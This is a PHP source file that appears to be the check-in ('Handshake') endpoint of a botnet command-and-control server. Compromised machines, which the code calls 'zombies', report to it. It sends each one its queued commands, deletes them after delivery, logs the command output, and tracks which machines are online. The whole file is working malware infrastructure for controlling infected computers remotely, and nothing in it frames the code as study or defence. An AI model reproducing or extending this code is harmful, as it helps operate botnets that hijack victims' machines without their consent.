<?php
/*
Page: Handshake
*/
header('Access-Control-Allow-Origin: *');
require_once('./includes/functions.php');

if(isset($_POST['do']) && $_POST['do'] == "callback") {
	$uid = $_POST['uid'];
	$zid = $_POST['vid'];
	$ipaddress = $_SERVER['REMOTE_ADDR'];
	$time = date("Y-m-d H:i:s");
	if(check_if_online($uid, $zid)) {
		update_last_handshake($uid, $zid, $time);
		//Check to see if there are any commands to be sent to zombie.
		//If there is a command lets send it to the zombie and then delete it to prevent it from sending twice.
		//Also update last handshake from zombie in databse
		//update_last_handshake($uid, $zid, $time);
		if(check_for_commands($uid, $zid)) {
			echo check_for_commands($uid, $zid);
			delete_command($uid, $zid);
		}
	} else {
		make_zombie_online($uid, $zid);
	}
}

if(isset($_POST['do']) && $_POST['do'] == "offline") {
	$uid = $_POST['uid'];
	$vid = $_POST['vid'];
	//file_put_contents("LOL.txt", "LOL");
	make_zombie_offline($uid, $vid);
}

if(isset($_POST['do']) && $_POST['do'] == "response") {
	$uid = $_POST['uid'];
	$zid = $_POST['zid'];
	$command = $_POST['command'];
	$response = $_POST['response'];
	create_zombie_log($uid, $zid, $command, $response);
}

if(isset($_POST['do']) && $_POST['do'] == "check_zombie_status") {
	$uid = $_POST['uid'];
	check_zombie_status($uid);
}
?>